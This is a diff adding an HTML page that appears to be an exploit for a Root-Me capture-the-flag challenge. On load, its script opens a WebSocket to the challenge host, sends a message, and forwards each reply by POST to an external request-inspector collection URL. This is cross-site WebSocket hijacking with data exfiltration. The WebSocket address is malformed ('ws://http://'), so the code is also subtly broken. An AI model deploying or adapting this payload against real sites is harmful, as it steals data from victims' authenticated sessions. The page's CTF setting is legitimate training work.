@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Code d'exécution automatique</title>
+  <script>
+    window.addEventListener('load', function() {
+      // Votre code JavaScript à exécuter
+      websocket = new WebSocket('ws://http://ctf28.root-me.org/room');
+      websocket.onopen = start;
+      websocket.onmessage = handleReply;
+
+      function start(event) {
+        websocket.send("attackers-message");
+      }
+
+      function handleReply(event) {
+        fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: event.data
+        });
+      }
+    });
+  </script>
+</head>
+<body>
+  <h1>Code d'exécution automatique</h1>
+  <!-- Contenu supplémentaire de la page -->
+</body>
+</html>
+
